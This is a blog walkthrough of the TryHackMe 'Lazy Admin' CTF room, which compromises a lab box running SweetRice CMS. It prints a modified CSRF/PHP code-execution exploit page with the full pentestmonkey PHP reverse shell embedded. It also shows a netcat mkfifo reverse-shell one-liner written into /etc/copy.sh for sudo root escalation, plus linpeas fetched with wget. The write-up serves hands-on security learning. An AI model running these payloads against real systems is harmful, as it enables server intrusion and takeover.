---
title: "THM Lazy Admin"
date: 2021-07-02T09:29:35+09:00
description: "Try Hack Me - Lazy Admin"
tags: [THM,CTF,PHP,Linpeas]
categories: [Ethical Hacking,CTF,TryHackMe,Linux,Pentesting]
comments: false
draft: false
---

To keep the momentum going I decided to try my hand at another [TryHackMe Room](https://tryhackme.com/room/lazyadmin). I came across lazy admin, and decided to give it a try. Who doesn't love a lazy admin in our field, right?

## Scans ##

Let's do some initial scans and see what we can find. If you are looking for why I use the scanning technique I do; you can see my previous write up [here](https://kalifornia909.info/post/thm-pickle-rick/)

After successfully pinging the IP of the box lets kick off a nmap scan. (Do note the IP in this scan is probably different than what you have.)
```
sudo nmap -A -T 4 -p- -v -oA nmap/lazyadmin 10.10.111.161
```
Thanks to the power of using the -v flag I can see that port 22 and port 80 are open. Yes, ssh and http are open to explore.

With http being open lets kick off a gobuster scan as well, and hope that it actually finishes in a decent time.
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,sh,txt,cgi,html,js,css,py -u 10.10.111.161 | tee gobuster.txt
```
Wait..That's a little different from last time you ran a gobuster scan. what is the ```| tee gobuster.txt```. That will pipe the output of gobuster into a text file. While this is running lets check out the website and see what we can manually find out.

Well things are looking promising. A name like lazy admin and a default Apache 2 page means that we have a chance.

{{<figure src="/images/Posts/009/defaultapache.jpg">}}

Lets take a look at what robots.txt gives us. Unfortunately, no loot except for the version and OS disclosure. Lets not forget that gives us information that could be useful when looking up potential exploits later.

{{<figure src="/images/Posts/009/robot.jpg">}}

Viewing the page source doesn't give anything obvious at first, but lets not completely rule anything out yet.

Now that we have done some poking and prodding around manually lets see what our scans have given us.
```
Nmap scan report for 10.10.111.161
Host is up (0.27s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/1%OT=22%CT=1%CU=33084%PV=Y%DS=4%DC=T%G=Y%TM=60DE60DE
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11N
OS:W6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R
OS:=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Uptime guess: 48.037 days (since Fri May 14 16:48:59 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   133.28 ms 10.2.0.1
2   ... 3
4   276.08 ms 10.10.111.161

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  1 17:42:06 2021 -- 1 IP address (1 host up) scanned in 354.76 seconds
```
I am so glad that gobuster gives output while it still scans. I glanced at my scan and saw that it pulled up ```/index.html``` and ```/content```. The index doesn't excite me much because we already saw that but lets look at the content directory. We come to see that it is running something called SweetRice as a website management system.

{{<figure src="/images/Posts/009/sweetrice.jpg">}}

Alright, well never heard of that before. Lets go to the googles and do the super hacker thing of searching for SweetRice exploit. Looks like exploit-db has definitely heard of SweetRice. I'm glad someone has.

I see that there is an [Arbitrary File Upload](https://www.exploit-db.com/exploits/40716) and think that looks juicy. Its a python script, but after looking at it, it needs a username/password. Well we haven't got any of that yet, so lets look at the other results.

There is a [Backup Disclosure](https://www.exploit-db.com/exploits/40718) but looking at text it was tested on Windows 10. Well, this machine let us know it was Ubuntu.

I fired up Burpsuite to see if intercepting the traffic, but it gave me nothing.

Lets try metaploit. Why not this isn't the OSCP. 
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                                                                                                     | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                                                                                                                  | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                                   | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                                     | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                                         | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                                                | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                                           | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                                                                                                       | php/webapps/14184.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Alright. Well I have no idea what version of SweetRice through any of my scans, so lets just see what we could find that would give us something nice and juicy that we can throw at a wall and see if it sticks. Something that stood out was the ```SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution```. If I can get PHP to execute that means I can possibly get a reverse shell and say in my best hacker voice "IM IN". 

Well lets just say the hacker voice is still on ice. That did not do anything for me.

At this point I envision myself as a child learning how to ride a bike, and lacking the skills of braking and control am heading right towards a brick wall. The great thing about TryHackMe is that it is an educational site fires, so lets learn some things. I fired up John Hammond's video that's in the video section of this room to see where I went wrong.

This is where I found the errors of my ways. The Backup Disclosure we found earlier was the key. However, i didn't add the ```/content``` directory for this to work. In the end the backup disclosure was found in ```http://10.10.111.161/content/inc/mysql_backup/```. 

Great! Pause the video and see how far we can get now. Lets get that backup file and see what we can do with it. 
```
http://10.10.111.161/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```
A .sql file what can we open that with. Well, I am a fan of sublime text so lets give that a shot. Looking at the beginning of the document it looks like a php file. A lengthy php file but none the less a php file. 

The php file has a line that will make you scroll forever right. In that line it gives some good information though. You can see the string of ```manager``` which could give us the username, and there is something resembling a hash after password ```42f749ade7f9e195bf475f37a44cafcb```. Lets try to use [crackstation](https://crackstation.net/) to see if we can crack it. Well that gives us a result, and it looks like an md5 hash. 

We have an username and password. What can we do with it because there hasn't been a place for us to try to log in. The vision of the brick wall approaching while riding a bike is coming to mind again. Let's play the video again and learn some more things.

## Exploitation ##

At first I thought the arbitrary code execution was a bust, but looking at the video again that will give us the login page we are looking for. Lets follow John Hammonds walk through on how to make this work for us. First lets copy the exploit so we can edit it to make it work for us.
```
searchsploit -m php/webapps/40700.html
```
That puts it in the directory you are working with. Now we are are going to have to change the html file. The first thing you need to change is the localhost to the IP of the machine and add the /content directory. Another change John made in his video is to change the html encoding in textarea. At the end of the editing it should resemble something like this.
```
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.111.161/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>

</textarea>
</form>
</body>
</html>
```
Don't forget that your IP will probably be different. The html file is complete, so lets run it.
```
firefox 40700.html
```
I didn't change the name of when I copied it into my local directory, so whatever your HTML file is name use that. This will bring you a login page. That's great because we already have a username and password.
{{<figure src="/images/Posts/009/login.jpg">}}

Enter your username and password to login to the website management. One thing I had to follow along the video with is to run the exploit again after logging in to the website management page. 
```
firefox 40700.html
```
Commented out in the bottom of the exploit we pulled down from searchsploit will give you an address to see if this was successful by giving you a php info page.
```
http://10.10.111.161/content/inc/ads/hacked.php
```
As long as this page generates you know you are on the right path.

Now that we have file execution let's give a php reverse shell a try. You can do this multiple ways. If you want to use a website to generate it for you, you can use [revshells.com](https://www.revshells.com/). If you are running kali you can copy the php-reverse shell into your directory and make the edits for this box.
```
cp /usr/share/webshells/php/php-reverse-shell.php .
```
I copied the reverse shell that came with Kali to give that a shot.

You will need you the IP address for the machine that you are using to attack this site, so in a terminal you are going to run ```ip a```. The output you are looking for is usually tun0 (tunnel 0 since since you are using a vpn to connect). If your setup is different then look for the IP address starting with 10. 

The php reverse shell file has great documentation commented out to give you more information about the file itself. What you are looking for is the lines that have ```// CHANGE THIS``` commented out afterwords. It is asking for your IP and port. Something similar to this.
```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.40.5';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Following along with John you are going to copy your PHP reverse shell to the previous html file that gave you the php info page. I copied the file to a new html file
```
cp 40700.html exploit.html
```
That leaves my proof of concept file in tact and now I can play with adding the php reverse shell.

How do you add your reverse shell to your proof of concept html file. I'm glad you asked. You will need to edit php youre executing, so look for the ```<?php
echo '<h1> Hacked </h1>';
phpinfo();?>```. That is what gave us our php info earlier. Now replace it with the entire text of your php reverse shell. I noticed John also changed the line of ```<input type="hidden" name="adk" value="hacked"/>``` to something different of ```<input type="hidden" name="adk" value="revshell"/>```. After the edits this is what my html file looked like.
```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.111.161/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="revshell"/>
<textarea type="hidden" name="adv">
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.40.5';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 





</textarea>
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```
Lets prep to listen with netcat and listen for an incoming connection. Remember the port you listed in the php reverse shell is the port you want to listen on.
```
nc -lvnp 9001
```
We are ready. Let's see if we can get this thing to connect to us. We are going to run the html file again
```
firefox exploit.html
```
You should notice something if you are still logged in to the website management site.
{{<figure src="/images/Posts/009/revshell.jpg">}}

That means that the proof of concept is still working. Let's navigate to the page and execute this. 
```
http://10.10.111.161/content/inc/ads/revshell.php
```
Remember following along with john we arent using hacked.php for this but we are using revshell.php. Take a look at your netcat listener and you should now see the prompt of ```$ www-data```. Hacker voice on "IM IN". 

## Find the Loot ##

Now that we have a reverse shell lets stabilize the shell. John gave an awesome resource for this in his video of [netsec](https://netsec.ws/?p=337). Let's go ahead and do this. You can use the method John used in his video, which is new to me.
```
/usr/bin/script -qc /bin/bash /dev/null
```

Alright we have a TTY shell now. Let's see about using OSCP's favorite tool [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). One common way I've seen it is to run a http server with python on your host box and ```wget``` the file on your target machine. Navigate to where your ```linpeas.sh``` file is and fire up the python server.
```
python3 -m http.server 80
```
That will start your websever. Now lets get that precious linpeas file.
```
wget 10.2.40.5/linpeas.sh
```
We will need to make that executeable so.
```
chmod +x linpeas.sh
```
Simple enough now lets run it.
```
./linpeas.sh
```
This colorful output is just awesome. Remember that red is your friend.

Linpeas points out that you can run sudo on a file in the ```/home/itguy``` directory so lets go over to that directory and look.
```
cd /home/itguy
```
When you type ```ls``` in the directory you get a nice gift of a user.txt file. Claim your flag.

Now we need to look up that ```backup.pl``` file because we can run that as sudo with no password. Thank you linpeas.
```
cat backup.pl
```
This is a pearl file that runs a shell on ```/etc/copy.sh```

Lets take a look at that file now.
```
cat /etc/copy.sh
```
Alright we are greeted with.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/
```
A reverse shell inside a reverse shell. This is revshellception. Lets make this our own, so we can get an elevated reverse shell. We will have to choose a different port, so I chose port 9100.

I had an issue with trying to fire up nano like John did in his video so I took a different approach. Since I can still write to it, and I am not trying to preserve any information I just used ```echo```.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.40.5 9100 >/tmp/f" > /etc/copy.sh
```
Make sure your IP and port is correct by using cat.
```
cat /etc/copy.sh
```
You should see your information now. Lets take that linpeas information to run sudo on the pearl script without using a password.
```
sudo /usr/bin/perl /home/itguy/backup.pl
```
Jump for JOY! We now have a root shell. Lets go get our loot. ```cd``` into the ```/root``` directory to see the string of text that you have been hunting for.
```
cat root.txt
```
Get your flag and free. 

This was an amazing learning experience, and there is no way I would of got here on my own without watching the walk through video. Thank you for putting out great content John Hammond. If you would like to follow along the video please see below. Make sure to stop by John's [YouTube]((https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw)) channel and subscribe. 

---

### Youtube Walkthrough ###
{{< youtube id="qDLtEP58bao" >}}
